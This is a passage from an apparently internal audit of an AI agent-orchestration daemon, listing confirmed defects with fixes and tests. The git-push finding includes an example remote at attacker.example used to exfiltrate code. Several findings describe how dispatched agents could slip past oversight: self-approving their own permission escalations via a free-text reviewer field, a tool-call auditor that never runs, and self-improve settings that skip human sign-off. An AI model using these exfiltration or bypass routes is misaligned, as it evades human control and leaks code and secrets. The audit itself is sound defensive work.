### H-DISPATCH-SEMAPHORE + H-ANSIBLE-NOTIMEOUT (MED, CONFIRMED)

**Defect:** the event-loop dispatch fan-out (`event_loop/loop.py:1558-1567`)
has **no** `asyncio.Semaphore` bounding the concurrent `gather` — this matches
the dispatch-semaphore proposed in `WAVE_C_DESIGNS_2026-07-10.md:426-452`
(C-EVENTLOOP item 13), now **CONFIRMED absent** rather than merely proposed.
Fan-out is bounded *upstream* though (`claim_runnable` limit=10 at
`repository.py:424,451`, plus the floor cap at `controllers/floor.py:56`), so
this is not "unbounded hundreds" in practice. The sharper finding: the ansible
subprocess on the **main dispatch path** (`loop.py:2647-2652`,
`await asyncio.to_thread(run_playbook)`) has **no** `asyncio.wait_for` timeout
wrapper, unlike the review path (`loop.py:1037-1044`), which does. Combined
with the ~10-wide upstream fan-out, that's up to ~10 concurrent
unbounded-duration ansible subprocesses that can wedge dispatch capacity
indefinitely. Separately, the DB connection pool is unsized
(`db/session.py:94,124,138`) — LOW, since the deployment is SQLite-only today.

**Fix:** add the dispatch semaphore from C-EVENTLOOP item 13 around the
`loop.py:1558-1567` gather; wrap the main-path `run_playbook` call in
`asyncio.wait_for(...)` mirroring the review path's timeout at
`loop.py:1037-1044`. Size the DB pool as a follow-up once a non-SQLite backend
is in play.

**Tests:** dispatch gather never exceeds the semaphore bound under a burst of
runnable tasks; a hung `run_playbook` on the main path times out and surfaces
the same error shape as the review path's existing timeout (regression guard
against silently reintroducing an unbounded wait).

### H-TEARDOWN (MED, CONFIRMED) — daemon teardown gaps beyond ExecutionEngine drain

**Status check:** not present earlier in this doc (Round-1 through Round-3) —
adding fresh here, not a duplicate.

**Defect:** beyond the already-covered C-ENGINE `ExecutionEngine` drain, daemon
shutdown leaves several other resources undrained: (a) self-update audit tasks
(`daemon.py:806`) are never awaited/cancelled-and-joined during teardown; (b)
`DeploymentManager` has no `shutdown()` method at all
(`infra/deployment.py:27,151`), so a non-idle GPU/inference stack is simply
abandoned on daemon exit — a live cost leak, not just a resource-cleanliness
issue — because teardown cancels the event-loop task at `daemon.py:2109`
*before* the idle-reconcile logic ever gets a chance to run, and there's no
`atexit`/signal-handler fallback to catch it; (c) `StallWatchdog.stop_sweeper`
(`timing.py:302-308`, called from `daemon.py:2121-2124`) does a **blocking**
`join(2s)` inline inside the async teardown path, stalling the event loop for
up to 2s during shutdown.

**Fix:** await/cancel-and-join the self-update audit tasks in teardown; add a
`DeploymentManager.shutdown()` that reconciles/tears down non-idle deployments
and call it *before* cancelling the reconcile task (or run one final
reconcile pass synchronously during shutdown), plus register an `atexit`/
signal fallback so a hard kill doesn't strand billable infra; replace the
inline blocking `join(2s)` in `StallWatchdog.stop_sweeper` with
`await asyncio.to_thread(...)` so teardown doesn't block the loop.

**Tests:** daemon shutdown with a pending self-update audit task completes
without leaking a task; a non-idle `DeploymentManager` deployment is torn down
(or reconciled) during shutdown, not abandoned; `stop_sweeper` during teardown
does not block the event loop (assert via a concurrently-scheduled no-op
completing promptly).

## Round-5 additions (2026-07-10 night-2)

### H-WRITER-DRAIN-UNWIRED (HIGH, LATENT) — subprocess-writer queued DB writes are never applied

**Status:** latent — no router in `src/` calls `enqueue_or_commit` today (only
tests exercise it), so unreachable in prod traffic. But the entire
`GLUDD_WRITER_MODE=subprocess` durable-write path is structurally disconnected,
and it silently drops writes rather than erroring, so it will fail invisibly
the moment a router adopts it.

**Defect:** `WriteQueue` (`ipc/queue.py:61-192`, an in-memory `asyncio.Queue`-
backed deque, `maxsize=1000`) is published to `app.state._write_queue` at
`daemon.py:928`, and is meant to be drained by
`EventLoop._drain_inbound_queue()` (`loop.py:775-821`) — but the production
`EventLoop` construction (`daemon.py:1658-1741`) never passes
`inbound_queue=`, so the drain loop never runs against it. The writer child's
own `EventLoop` (`_child.py:164`) omits it too. The alternate spool-file path
is equally dead: `_child.py:84-123` `_drain_spool` exists to read a JSONL
spool, but `daemon.py:929` spawns `WriterProcess` with only `db_config` — no
`inbound_spool_path` — so `_drain_spool` is unconditionally skipped. Net
effect: an envelope enqueued via `writer/bridge.py:167` `enqueue_or_commit`
gets an HTTP 202 immediately, then sits in the in-memory deque forever with no
consumer — guaranteed loss on the next restart, and shutdown drain is
lossy-by-design anyway (`daemon.py:2130-2133` `clear()`).

**Fix (before any router adopts the queued path):** wire
`inbound_queue=write_queue` into the production `EventLoop` construction at
`daemon.py:1658-1741` (and the writer-child's at `_child.py:164`), or
alternatively wire the `WriteQueue` → spool-file → child `_drain_spool` bridge
end-to-end (pass `inbound_spool_path` at the `daemon.py:929` `WriterProcess`
spawn) — pick one durable path, not both half-wired. Add a DB-landing ack so
202 is only returned after the write actually applies (not merely enqueues).
Add requeue/retry on a per-envelope apply failure — currently a failed apply
inside the drain loop is dropped silently (`loop.py:803-821`), not retried.

**Tests:** an envelope enqueued via `enqueue_or_commit` in
`GLUDD_WRITER_MODE=subprocess` actually lands in the DB end-to-end (not just
"was accepted with 202"); a crash mid-drain does not silently lose the
envelope (requeued or persisted, not dropped); the prod `EventLoop`
construction is asserted to pass a non-`None` `inbound_queue`
(regression guard against the wiring being dropped again).

### H-ADMIN-PSK-ONLY (HIGH) — entire /admin/* mutating surface has no capability/RBAC check, only the shared PSK

**Defect:** every `/admin/*` endpoint is gated by nothing but the single
shared `GLUDD_AUTH_PSK` (`auth_and_stats_middleware`, `daemon.py:2468-2523`,
constant-time `check_bearer_token`) — there is no `@Depends`/router split by
privilege tier and zero `can_invoke`/`has_permission` calls in any router
handler. Every dispatched agent holds this same PSK
(`renderers/runner.py:227-229` injects `GLUDD_AUTH_PSK` into the agent subprocess
env), so any agent — or any caller who obtains a leaked PSK — can reach the
entire privileged surface: compute deploy/destroy, spend reconfigure, STS
issue/revoke, perm-spec `PUT` (`security.py:406`), escalation approve/deny,
integrity approve, filestore write/remove, process signal, account delete,
webhook registration, model add/remove. Worst instance: the human-review
endpoints (`*/approve`, `PATCH /api/human-todos/{id}` →
`_sync_escalation_from_human_todo`, `security.py:183-218`) only check that a
free-text `human_reviewer`/`human_resolver` field is non-empty — they never
verify the caller's identity — so an agent holding the PSK can write its own
name into that field and self-approve its own permission escalation.

**Fix:** add a capability gate per privileged endpoint, reusing the existing
capability lattice / agent-permission matrix (ties to C-SEC-1's dead-registry
finding — that matrix needs to actually be consulted here too). The
human-review endpoints need a genuinely distinct human-identity second
factor — not a free-text field an agent can populate — i.e. a separate
operator credential/role distinct from the agent-held PSK, checked
server-side rather than trusted from the request body.

**Tests:** a request carrying an agent-tier PSK is refused on a privileged
`/admin` op reserved for operator tier; a self-approval attempt on an
escalation record (reviewer/resolver identity equal to the requesting
agent's own identity) is refused rather than accepted on the strength of a
free-text field.

### H-BINARY-BUNDLING-GAPS (MED) — redistributable can't run required tools with an empty PATH

**Defect:** three independent gaps in the bundled-binary story
(cross-ref `BINARY_BUNDLING.md`): (a) `rg` bundling is non-functional — the
Makefile's `bundle-ripgrep` target has a placeholder `RG_SHA256` of all
zeros, so `shasum -c` always fails and `dist/binaries/rg` is never populated
(`Makefile:2266-2282`), silently degrading to bare PATH lookup instead of
failing the build; (b) `tofu` and `osquery` have working
`BinaryBootstrapper` machinery — pinned `KNOWN_VERSIONS`
(`OPENTOFU_VERSION=1.9.0`/`OSQUERY_VERSION=5.10.2`), fail-closed digest
verification, `download_bundled_binaries.py` populating `dist/binaries` — but
the actual runtime call sites never consult it: `infra/deployment.py:184`
`get_infra_binary()` is a PATH-only `shutil.which`, never calling
`get_bundled_binary_path`, and `connectors/osquery.py:95` defaults to the
bare name `"osqueryi"`; (c) `BinaryPathResolver.get_secrets_binary()`
(vault/bao CLI) and the `BinaryPaths.git`/`ansible_playbook` fields are dead
code — defined, zero callers — those binaries are invoked elsewhere by bare
literal argv strings instead.

**Fix:** set a real per-platform `RG_SHA256` in the Makefile (or make
`bundle-ripgrep` fail the build loudly on a placeholder/mismatched hash,
never silently skip); route `infra/deployment.py:184` and
`connectors/osquery.py:95` through `get_bundled_binary_path` first
(bundle-first resolution, falling back to PATH only if bundling is
genuinely absent); either wire `BinaryPathResolver.get_secrets_binary()` and
the dead `BinaryPaths` fields into their real call sites, or remove them so
the dead code doesn't imply a guarantee that isn't kept.

**Tests:** a build with `PATH` emptied still successfully runs `rg`, `tofu`,
and `osqueryi` by resolving to `dist/binaries`; running `bundle-ripgrep` with
the placeholder/all-zero sha fails the build instead of silently producing
an empty `dist/binaries/rg`.

## Round-6 additions (2026-07-10 night-2)

### H-GIT-PUSH-REMOTE (MEDIUM, CONFIRMED) — push helpers validate `remote` for shell-injection only, not SSRF/URL

**Defect:** `git_automation/repo.py` push helpers — `push` (:279-284) and
`push_to_remote` (:785-790) — validate the `remote` positional only via
`_reject_leading_dash` plus a `--` end-of-options guard; there is **no
allowlist** and **no SSRF/URL vetting**. `git push <remote>` accepts a full
URL, and `_reject_leading_dash` happily permits `https://...` (it only rejects
a leading `-`). The SSRF machinery that already exists in this same file —
`reject_unsafe_repo_url`/`_host_is_blocked` → `resolved_host_is_blocked`
(repo.py:64-126) — is wired into **clone only**, not push: an asymmetry
between the two directions of repo network I/O. Reachable end-to-end: the
ansible module `collections/ansible_collections/general_ludd/agent/plugins/
modules/gludd_git.py:274-278` (`op == "push"`) reads
`remote=module.params["remote"]` with no intermediate validation and forwards
it verbatim into `push_to_remote(...)` (the exact assignment is on line 276) —
so an agent-authored playbook setting `remote: https://attacker.example/x.git`
pushes the local repo's commits to an arbitrary attacker-controlled remote,
i.e. repo/code **exfiltration**. (`self_improve/harness.py:384`
`git.commit_and_push(message)` uses the hardcoded default `remote="origin"`
and is not itself exposed to untrusted input — confirmed no `remote=` kwarg is
threaded through from self-improve.)

**Fix:** allowlist `remote` to a configured named remote (e.g. only accept
values present in `git remote` for the repo, or a project-config allowlist),
OR — for the URL-form case — route it through the existing
`reject_unsafe_repo_url` the same way `clone` already does, so a URL remote
gets the identical scheme/`::`/SSRF vetting as a clone source.

**Test:** `op=push` (and direct `GitAutomation.push`/`push_to_remote` calls)
with a URL-shaped or non-allowlisted `remote` is rejected; a legitimate named
remote (e.g. `origin`) still pushes successfully; regression test asserting
`push`/`push_to_remote` call the same vetting path `reject_unsafe_repo_url`
already exercises for clone.

**ALSO note (LOW, latent, fix alongside for symmetry — no untrusted caller
today):** `tag_release`/`tag_checkpoint` (repo.py:271-277) lack
`_reject_leading_dash` + a `--` guard on the `tag` argument; `remove_worktree`
(repo.py:526-527) lacks an `_reject_escaping_path`-style check on
`worktree_path` (confined in practice because callers only pass
git-registered worktree paths, so not currently exploitable, but the other
path-taking methods in this file all have an explicit confinement check and
this one doesn't). Add both for consistency with the rest of the file's
defense-in-depth posture; no test urgency since there's no untrusted caller,
but a regression test (leading-dash tag rejected; escaping worktree path
rejected) should land with the fix.

### H-MIGRATIONS-DECORATIVE (HIGH, CONFIRMED) — production alembic migrations never run their `upgrade()` body

**Defect:** in production, alembic migrations NEVER execute. Daemon startup
(`daemon.py:913-914`) calls `await ensure_tables(engine)`, which is
`Base.metadata.create_all` under the hood (`db/session.py:158-162`:
`ensure_tables` does `conn.run_sync(Base.metadata.create_all)` when the URL is
SQLite). Immediately after, `daemon.py:986-995` calls `stamp_head`
(`db/migrations.py:24-25`: `command.stamp(cfg, "head")`) — `stamp` **only
writes the alembic `alembic_version` revision id**, it never executes a
migration's `upgrade()` body. A repo-wide check confirms `command.upgrade(`
is called **only from 3 test files**, never from anything under `src/`.
Compounding this: `create_all(checkfirst=True)` (SQLAlchemy's default) only
creates tables that are **missing** — it does not `ALTER` an existing table to
add a column/index/constraint. Because the daemon stamps straight to `head`
right after `create_all`, any subsequent manual `alembic upgrade head` run by
an operator is a silent no-op (the revision is already stamped at head).

Net effect: any migration whose real work is an **alter** to an
already-existing table (add column/index/CHECK constraint to a table that a
prior code version already created via `create_all`) **never applies** to a
production SQLite DB that was first created under an older code version.
Concrete confirmed instances of this shape in the migration set: the
blob-length CHECK-constraint recreate (see `tests/unit/
test_db_models_blob_length.py`) and the `BucketLease.expires_at` index
addition — both are alter-an-existing-table migrations with no live path into
a DB that predates them. New-table migrations are masked/hidden by this bug
because `create_all` independently creates any missing table anyway, so only
the alter-class migrations are silently dead. This is not caught by
`test_alembic_orm_parity`/`create_all_parity`-style tests because both build
their "migrated" schema from a **fresh** `upgrade` run starting at base — they
never exercise the actual production sequence of
`create_all` (old schema) → `stamp_head` → later code adds an alter migration
→ real deploy never runs `upgrade`.

**Fix:** add `upgrade_head(cfg: AlembicConfig) -> None: command.upgrade(cfg,
"head")` to `db/migrations.py` alongside `stamp_head`. In `daemon.py`, replace
the `ensure_tables` + `stamp_head` pair with `upgrade_head` unconditionally —
it is idempotent on an up-to-date DB (no-op) and correctly runs base→head on
an empty/fresh DB (so `create_all` is no longer needed on the daemon startup
path for schema creation). Keep `create_all` only as a try/except fallback for
non-daemon callers (tests, scripts) that want a quick throwaway schema without
running through alembic.

**Correction (2026-07-10 night-3 re-audit) — the fix above is UNSAFE as a bare
swap; re-verified against the current code:**

1. **Ordering — must run BEFORE `seed_initial_queues`, not where `stamp_head`
   currently sits.** `daemon.py` today runs schema creation (`ensure_tables`,
   :913-914) **before** `seed_initial_queues` (:922 in subprocess-writer mode /
   :940 in inline mode), and only runs `stamp_head` **after** seeding has
   already completed (:986-995) — seeding requires the tables to exist first.
   A one-line swap of `stamp_head` → `upgrade_head` at its *current* call site
   (after seeding) is not equivalent to the intended fix: `upgrade_head` must
   instead run where `ensure_tables` runs today (before `seed_initial_queues`),
   since on a legacy DB an alter-class migration may need to run before rows
   can safely be seeded. This is a bigger change than swapping one function
   name — it requires moving the migration call earlier in daemon startup.
2. **Data loss — migration 022 unconditionally drops `memory_records`.**
   `022_recreate_memory_records_g1.py:27` (`op.drop_table("memory_records")`)
   destroys the table's contents before recreating it under the G1 schema.
   Its docstring justifies this as safe "because SQLite has no data in this
   unused table" — true only as long as `memory_records` has never actually
   been written in a production deployment. Because migrations are decorative
   today (this very defect), that assumption has never been exercised for
   real. The moment `upgrade_head` actually runs on a live daemon instead of
   being perpetually skipped, any row that has accumulated in
   `memory_records` (e.g. via `MemoryRepository.set`, `db/repository.py:
   2776-2841`) is destroyed with no backup and no way back — a genuine
   data-loss risk introduced by turning on the very fix proposed above.
3. **Required guard, not a straight enable.** Before wiring `upgrade_head`
   into daemon startup, migration 022 needs a pre-upgrade branch that either
   (a) rewrites `022.upgrade()` to copy existing `memory_records` rows forward
   into the new `(agent_id, key, value, namespace, ttl_seconds)` shape instead
   of an unconditional drop, or (b) adds a pre-flight check that aborts with
   an operator-visible alert if the table is non-empty rather than silently
   dropping it. Ship the guard together with the ordering fix in (1) — do not
   land "just enable `upgrade_head`" as a standalone change.

This doesn't change the underlying diagnosis (migrations are decorative in
production today) — it changes the fix from "swap `stamp_head` for
`upgrade_head`" to "swap it, run it earlier than `stamp_head`'s current call
site, and land a 022-specific data-safety guard first."

**Test:** assert daemon startup calls `upgrade_head`, not merely `stamp_head`
(a wiring-regression guard); a regression test that builds a DB from an OLDER
schema snapshot (pre-alter-migration), then calls `upgrade_head`, and asserts
the alter (e.g. the blob-length CHECK or the `BucketLease.expires_at` index)
actually lands — the exact production scenario the existing parity tests
cannot catch because they always start from a fresh `upgrade` at base.

## Round-7 additions (2026-07-10 night-2)

### H-OBS-TENANT-LEAK (HIGH, CONFIRMED) — observability/reporting endpoints leak cross-tenant data because the PSK carries no tenant identity

**Defect:** the daemon's single global `GLUDD_AUTH_PSK` middleware
(`daemon.py:2468-2504`) authenticates a request but carries **no tenant
identity** — `AuthPosture` has no `project_id` field (`security/auth.py:32-49`).
Consequently every `project_id` query param across the observability/reporting
surface is a **client-supplied courtesy filter**, not an enforced authorization
boundary: any PSK holder can omit or forge it to read across all tenants.
Confirmed leaks:
- `/api/spend`, `/api/costs`, `/admin/costs`, `/api/credits`
  (`routers/spend.py:51,144,107,198`) — **no** `project_id` param at all; global
  and by-project cost breakdowns are visible to any PSK holder.
- `/admin/benchmark/recent` (`routers/benchmark.py:30-55` →
  `repository.py:1042-1051` `list_recent`, no `WHERE project_id`) and
  `/admin/benchmark/scores` (`benchmark.py:18-28` — the repo method supports
  `project_id` but the endpoint never passes it) — cross-tenant benchmark rows.
- `/api/traces`, `/api/facts`, `/api/metrics`
  (`facts.py:461-476/393-447/449-459`) — `project_id` is **optional**; omitting
  it returns all-tenant data (scoped-if-requested, not enforced).
- `/api/accounting` (`accounting.py:240-248`) — `account_all()` is global by
  design and leaks per-project cost to any PSK holder.
- `/api/status` (`todos.py:497-567`) — a **public** path (no PSK at all),
  unauthenticated info-disclosure of version/hardware-profile/queue-depths/
  binary-versions.

**Positive (no fix needed):** the one HTML render path `/render/{name}` is
well-defended — `SandboxedEnvironment` + `autoescape=select_autoescape(default=True)`
(`render.py:75-80`); `/admin/ansible/render` uses `render_sandboxed`
(`StrictUndefined`, empty globals, unsafe-wrapped vars). But the JSON endpoints
return free-text agent/user content (todo description, `task_description`,
`match_text`) **unescaped**, and no `html.escape`/`markupsafe`/`bleach` exists
anywhere in `src/` — any first-party dashboard rendering these into the DOM
inherits stored-XSS (the backend provides no defense-in-depth for that case).

**Root cause** (shared with H-ADMIN-PSK-ONLY + H-DB-TENANT-SCOPING above): the
PSK is not tenant-bound.

**Fix:** (1) real multi-tenancy requires binding project scope to the
**credential** (per-project tokens / `project_id` in `AuthPosture`), not
client-supplied params — the architectural fix, ties to C-SEC-1. (2) Interim:
add and **enforce** `project_id` scoping on `/api/spend|costs|credits` and
`/admin/benchmark/recent|scores` (require the caller's project scope, reject
cross-project reads). (3) Gate or trim `/api/status` (currently unauthenticated).
(4) Document the "JSON output is unescaped — clients MUST escape" contract, or
add output-encoding for any first-party dashboard.

**Tests:** a project-A-scoped credential cannot read project-B spend/benchmark
data; `/api/status` doesn't leak sensitive host detail unauthenticated.

## Round-8 additions (2026-07-10 night-2)

### H-STARTUP-NULL-DEPS (MEDIUM, CONFIRMED) — two construction-order bugs silence the GPU-cost-teardown

**Defect:** two independent instances of the same construction-order bug class
silently disable the idle-GPU cost-tracking phase. (a) `daemon.py:1736` passes
`infra_tracker=getattr(app.state, "_infra_tracker", None)` into `EventLoop(...)`
(constructed at 1658-1741), but `app.state._infra_tracker` is only created at
`daemon.py:1832-1833` — **after** the `EventLoop` already exists.
`EventLoop.__init__` stores it as a plain snapshot (`loop.py:343`) and never
re-reads `app.state`, so it's permanently `None`. Consumed at
`loop.py:3595-3609` (idle-GPU cost recording) = dead code. (b)
`daemon.py:1733` reads `app.state._deployment_manager` before it's set — it's
lazily created in `routers/compute.py:61-79` on first `/admin/compute/deploy`,
which can't fire before startup completes — so the snapshot is `None` at
`loop.py:330`, and the idle-GPU auto-teardown `self._deployment_manager.destroy(...)`
at `loop.py:3612` is likewise dead code. Net effect: the idle-GPU
cost-tracking + auto-teardown phase never runs at all — combined with
H-TEARDOWN (Round-4: no shutdown teardown either), a deployed GPU/inference
stack is torn down **neither** at idle **nor** at shutdown, a confirmed cost
leak from both angles. This file's own CA-T7/CA-T8/CA-T9/H3 comments document
3 prior fixes of this exact bug class (`health_tracker`/`quantization_tracker`/
`spend_limiter` pre-built before `EventLoop()`); `infra_tracker` +
`deployment_manager` are two more unfixed instances of the same pattern.

**Fix:** pre-build `infra_tracker` + `deployment_manager` **before** the
`EventLoop()` construction (mirror the CA-T7/8/9 fix pattern), OR have
`EventLoop` lazily fetch them from `app.state` at phase-execution time instead
of snapshotting at construction.

**Tests:** after startup, `EventLoop._infra_tracker` and
`EventLoop._deployment_manager` are the live `app.state` instances, not
`None`; the idle-teardown phase actually invokes `destroy` on an idle
deployment (regression guard against the same construction-order class
recurring a 3rd/4th time).

**Re-confirmed (Round-13, 2026-07-10)**, with exact current citations:
`daemon.py:1658-1741` remains the `EventLoop(...)` constructor span;
`infra_tracker=getattr(app.state, "_infra_tracker", None)` is at line 1736
and `deployment_manager=getattr(app.state, "_deployment_manager", None)` at
line 1733 (both unchanged); `app.state._infra_tracker` is still assigned only
later at `daemon.py:1832-1833`; a repo-wide check confirms
`app.state._deployment_manager` is STILL never assigned anywhere in
`daemon.py` — only lazily in `routers/compute.py:74-78` (assignment at
`:78`). `loop.py:330`/`:343` store the two permanent `None` snapshots; the
dead-code branches are `loop.py:3595-3604` (GPU-seconds recording) and
`loop.py:3610-3612` (`deployment_manager.destroy()`), with related
idle-teardown bookkeeping at `loop.py:3619-3621` that still runs
unconditionally regardless of whether `destroy()` fired. No new defect
surfaced on this pair; confidence raised to independently-reconfirmed. See
H-ADAPTIVE-ROUTER-NULL (Round-13, below) for a THIRD instance of this exact
construction-order bug class, found this round in the same
`_get_or_create_extended_subsystems`/`EventLoop` startup path.

### H-RELOAD-CONCURRENT (MEDIUM, ties to C-RELOAD) — concurrent `/admin/reload` calls race on shared registries with no lock

**Defect:** `POST /admin/reload` (`routers/reload.py:74-103`) builds a
brand-new `HotReloader` on every call (no caching/guard) and runs `.reload(scope)`
via `asyncio.to_thread` — a real OS thread. `HotReloader.__init__`
(`reload/hot_reloader.py:63-90`) and its only other construction site
(`reload/self_improve.py:26`) hold no lock. Two concurrent `/admin/reload`
calls get **separate** `HotReloader` instances, but both threads mutate the
**same** shared `skill_registry`/`prompt_registry`/`worker_broadcaster` with
zero synchronization — a genuine data race. Admin/PSK-gated, so it needs
concurrent operator/automation reloads to trigger, but this is the concrete
reachable instance of the `C-RELOAD` module-level-lock design (see
`docs/design/WAVE_C_ADDENDUM_2026-07-10.md` C-RELOAD correction) —
cross-reference it.

**Fix:** the module-level lock table keyed by resolved path (per the
C-RELOAD corrected design) serializes concurrent reloads regardless of
per-instance `HotReloader`, closing the race without requiring a singleton
`HotReloader`.

**Tests:** two concurrent `/admin/reload` calls serialize (second waits for
the first to release the path's lock); no torn registry state observed
across the concurrent pair (assert `skill_registry`/`prompt_registry` end in
a fully-applied-or-fully-pending state, never a partial mix from both
threads).

### H-READYZ-PREMATURE (LOW, def-in-depth) — `/readyz` treats "task not yet set" the same as "task healthy"

**Defect:** `/readyz` (`daemon.py:2590-2622`) reads `_event_loop_task` via
`getattr(...)` defaulting to `None`, and treats "not yet set" identically to
"task healthy" — it never **positively** requires the task to exist before
returning ready. A request arriving before `daemon.py:1757` (where the task
is actually assigned) gets a `200`/ready response. Not exploitable under
standard ASGI — lifespan reaches `yield` at `daemon.py:2048` before HTTP is
served at all, so ordering already prevents this in the common case — but
it's a defense-in-depth gap for multi-worker deployments, non-standard hosts,
or in-process tests that call the handler directly without going through
full ASGI lifespan sequencing.

**Fix:** `/readyz` returns not-ready (`503`) when `_event_loop_task` is
`None`, rather than folding the missing-task case into the same branch as a
healthy task.

**Tests:** calling the `/readyz` handler with `app.state._event_loop_task`
unset (or explicitly `None`) returns not-ready/`503`; with a live task
assigned, returns ready/`200` (regression guard on the existing happy path).

## Round-9 additions (2026-07-10 night-2)

### H-LANGGRAPH-AUDITOR-NOOP (MED-HIGH, CONFIRMED) — LangGraph tool-loop's `tool_auditor` is stored but never invoked

**Defect:** `execution/langgraph_agent.py` `LangGraphAgentLoop.__init__` accepts
and stores `tool_auditor` (:55,62) but **never invokes it** — no `.audit()`/
`.record_success()`/`.record_error()`/`.reset()` call exists anywhere in the
file (grep confirms only the constructor assignment). Contrast
`ToolCallLoop`, which calls the auditor before/after every tool call and on
error (`tool_loop.py:256-257,289-290,297-298,315-316,337-338`). Since
`event_loop/loop.py:2363,2369` constructs a **real** `ToolCallAuditor()` and
passes it into `LangGraphAgentLoop`, this is a false sense of coverage —
adversarial/anomalous tool-call detection silently no-ops whenever
`use_langgraph_tool_loop=True` (config-gated, default `False`). Compounding
gap: `LangGraphAgentLoop` also has **no** `budget_guard`, **no**
`adversarial_detector`, **no** cumulative `max_total_tokens` cap, and **no**
`work_type_max_iterations` — all present on `ToolCallLoop`
(`tool_loop.py:58-62,98-102,174-186,215-220`); the only bound on the
LangGraph path is `recursion_limit` plus a per-tool `asyncio.wait_for` — a
DoS/cost-control regression specific to the LangGraph path.

**Fix:** wire the auditor calls (pre/post/on-error, mirroring `tool_loop.py`'s
call sites) plus `budget_guard` and a cumulative token cap into
`LangGraphAgentLoop`'s tool-dispatch node, bringing it to parity with
`ToolCallLoop`.

**Tests:** an anomalous/over-budget tool-call sequence is caught on the
LangGraph path too (currently only caught on the `ToolCallLoop` path).

### H-HUMANGATE-NO-CHECKPOINTER (MED-HIGH, PLAUSIBLE-high-confidence) — gate graph compiled without a checkpointer breaks interrupt/resume

**Defect:** `execution/human_gate.py:62-73` `_build_gate_graph()` does
`StateGraph(_GateState)...compile()` with **no** `checkpointer=`. LangGraph's
`interrupt()`/`Command(resume=...)` mechanism requires a compiled-in
checkpointer to persist the paused state between the initial `ainvoke()`
(which returns early on the interrupt) and the later
`ainvoke(Command(resume=...), config)` in `resume()` (:216) — without one, the
second call has no checkpoint to resume from `thread_id` and instead re-runs
`gate_node` from entry, hitting `interrupt()` again rather than consuming the
human decision. Untested by the suite: both `test_human_gate.py` and
`test_hitl_approval_wiring.py` exclusively **mock** `gate._graph`, never
exercising the real compiled graph's interrupt/resume round-trip. Net effect:
HITL approval via LangGraph may be non-functional end-to-end.

**Fix:** compile the gate graph with a checkpointer (`MemorySaver` or a
`SqliteSaver`); add a real (non-mocked) interrupt→resume round-trip test.

**Note (safe, no urgent exposure):** `resume()` is only reachable via
`POST /admin/review/approve/{thread_id}` (`routers/review.py:58`), which is
PSK-gated and mutating (not in `_PUBLIC_PATHS`), and is not wrapped as an
agent tool — an agent cannot forge a resume itself.

**Tests:** a real (unmocked) `_build_gate_graph()` instance: `ainvoke()`
returns on the interrupt; a subsequent `ainvoke(Command(resume=...), config)`
with the same `thread_id` actually consumes the human decision and proceeds
past `gate_node`, rather than re-hitting the interrupt.

### H-LANGGRAPH-FACTORY-ROLE-TRAP (MED, latent) — `make_langgraph_tool_loop` has no required `role`, dispatch-gate skipped

**Defect:** `agents/capabilities.py:198-219` `make_langgraph_tool_loop` has
**no** `role` param, so `LangGraphAgentLoop.__init__` defaults `role=None` →
`check_dispatch` is skipped (`langgraph_agent.py:105-106`). Dead code today —
the factory's only caller is a test; production uses
`event_loop/loop.py:2364`, which constructs `LangGraphAgentLoop` directly and
passes `role="event_loop"`. But it's a latent trap: the moment anyone wires
this factory into a real call site without threading a `role` through, the
LangGraph path runs **ungated** (no dispatch/capability check at all). Mirrors
the already-known `make_tool_loop`'s `role=None` trap.

**Fix:** add a required `role` param to `make_langgraph_tool_loop` (mirror
whatever fix lands for `make_tool_loop`'s `role=None` trap), threading it into
the `LangGraphAgentLoop` construction.

**Tests:** calling `make_langgraph_tool_loop` without a `role` refuses/raises
(or the signature makes omission impossible — a type-level regression guard);
with a `role` supplied, `check_dispatch` is exercised on tool calls.

### H-PROJECT-OVERLAY-DANGEROUS-FIELDS (HIGH, systemic) — untrusted project config can override security-posture fields, project wins

**Defect:** an untrusted TARGET repo's `.gludd/general-ludd.yml` is
deep-merged over `UserConfig` with **project winning**
(`_apply_project_overlay`, `daemon.py:182-208`), and several
project-overridable fields change security posture rather than mere
behavior — the same "untrusted-repo-controls-gludd" theme as the
ANSIBLE_COLLECTION_TRUST finding. Confirmed dangerous overlay vectors:
- `connectors` — a project can register a connector pointing `base_url` at an
  attacker URL with `token_env=<any secret env var>`; the connector reads
  `os.environ.get(token_env)` and sends it to that URL → arbitrary-env-var
  **secret exfiltration**. HIGH.
- `database.url` — project-controlled SQLite path → arbitrary-path file
  write. HIGH.
- `budget` — no ceiling clamp on the overlay → a project overlay raises or
  removes the spend cap → unbounded spend. MED-HIGH.
- `issues` — project can redirect the GitHub/issue-polling source → task-
  origination hijack: the daemon polls an attacker-controlled source and
  executes whatever tasks it injects. HIGH.
- `self_improve` — `auto_queue: true` (`event_loop/loop.py:4147-4157` via
  `SelfImproveGate`) sends self-authored fix-todos straight to
  `QUEUED`/dispatch, **bypassing** the `APPROVAL_REQUIRED` human sign-off;
  `allow_unverified_reload: true` (`loop.py:2803`) makes a code-hot-swap
  health-check **fail open** when health state is unavailable. MODERATE.

**Safe by omission (no fix needed now, but flag for future refactors):**
`model_profiles`, `process_isolation`, `self_update.auto_apply_config`,
`deletion_gate_threshold`, `agents`, `ornith_binary_path` are wired only to
operator-only config sources today, not project-overlaid — "dead by
omission" rather than actively guarded, so a future refactor that
reconnects them to the project overlay would silently reintroduce this same
class of risk. Worth a code comment at the overlay call site warning future
editors not to widen the merge without re-checking this list.

**Fix:** restrict the project overlay to an **allowlist** of behavioral/
cosmetic fields; security-posture fields — `connectors`, `database`,
budget-ceiling, `issues` sources, `self_improve` gates, auth — must be
**operator-only**, never project-overridable (mirror the
ANSIBLE_COLLECTION_TRUST trust-tier split: operator/user tier trusted,
project tier untrusted).

**Tests:** a project overlay setting `connectors`, `database.url`,
budget-ceiling, `issues`, or `self_improve.auto_queue` is **ignored**
(operator config wins / the overlay is rejected for that key); a genuinely
behavioral/cosmetic field in the overlay still applies (regression guard
that the allowlist isn't over-broad in the other direction).

## Round-10 additions (2026-07-10 night-2)

### H-MEMORY-CROSS-PROJECT-BLEED (MED-HIGH, CONFIRMED) — agent memory table has no project_id, cross-project leak+overwrite

**Defect:** `MemoryRecordModel` (`db/models.py:731-757`) has **no** `project_id`
column — only `agent_id` + `namespace` + `key`, unique on
`(agent_id, key, namespace)`. The production caller
`event_loop/loop.py:542` `_build_memory_section` sets
`agent_id = todo.assigned_agent or todo.work_type` — generic role/work-type
strings like `"bug_fix"`/`"backend"`/`"agent"`, not namespaced by project. The
daemon manages multiple projects behind one shared `MemoryRecordModel` table
plus one global `app.state._memory_repo` (`daemon.py:1613`). So two projects
whose todos share a `work_type`/`assigned_agent` read and write the **same**
memory row: Project A's agent notes leak into Project B's prompt
